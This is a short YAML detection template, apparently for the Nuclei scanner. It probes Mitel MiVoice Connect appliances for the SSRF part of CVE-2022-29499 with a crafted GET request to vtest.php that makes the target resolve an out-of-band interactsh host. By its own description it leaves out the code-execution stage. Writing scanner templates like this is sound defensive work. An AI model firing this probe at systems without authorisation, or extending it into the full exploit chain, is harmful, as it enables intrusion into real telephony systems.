id: CVE-2022-29499

info:
  name: Mitel MiVoice Connect Remote Code Execution
  description: |
    Make a Mitel do a DNS lookup by exploiting the SSRF component of the CVE-2022-29499 remote code execution vulnerability.
    Does not exploit the second part of the bug chain to gain code execution, only uses the SSRF part.
  reference:
    - https://www.mitel.com/en-ca/support/security-advisories/mitel-product-security-advisory-22-0002
    - https://www.crowdstrike.com/blog/novel-exploit-detected-in-mitel-voip-appliance/
    - https://arcticwolf.com/resources/blog/lorenz-ransomware-chiseling-in/
  metadata:
    verified: "true"
  author: dmartyn
  severity: medium
  tags: dns,oob,rce,ssrf
  
requests:
  - raw:
      - | # try resolve
        GET /scripts/vtest.php?get_url=http://{{interactsh-url}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Connection: close

    matchers:
      - type: word
        part: interactsh_protocol # Confirms the DNS Interaction
        words:
          - "dns"
